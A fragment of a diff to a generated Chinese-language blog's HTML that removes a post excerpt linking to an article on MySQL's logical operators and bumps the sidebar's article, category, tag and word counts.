-          <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524846648.9156046.png" alt=""></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/MySQL的逻辑运算符-and-or-xor-的工作机制.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2316,7 +2395,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">文章</span>
                 </a>
               </div>
@@ -2327,7 +2406,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">65</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2338,7 +2417,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-count">105</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2423,7 +2502,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">70.4k</span>
+    <span title="Site words total count">72.8k</span>
   
 </div>
 
